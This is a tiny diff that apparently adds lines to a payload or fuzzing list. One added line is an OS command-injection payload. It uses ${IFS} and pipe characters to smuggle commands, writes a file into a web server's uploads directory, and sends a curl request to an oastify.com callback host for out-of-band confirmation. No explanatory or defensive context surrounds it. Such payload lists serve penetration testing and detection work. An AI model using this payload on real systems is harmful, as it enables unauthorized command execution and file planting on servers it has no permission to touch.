@@ -1,0 +1,5 @@
+echo 'ls'
+2
+3${IFS}|echo '123' > /var/www/html/uploads/eltron.txt| curl http://u3y9zziaxuz8nysu7ea9khgmmds9gy.oastify.com
+4
+5
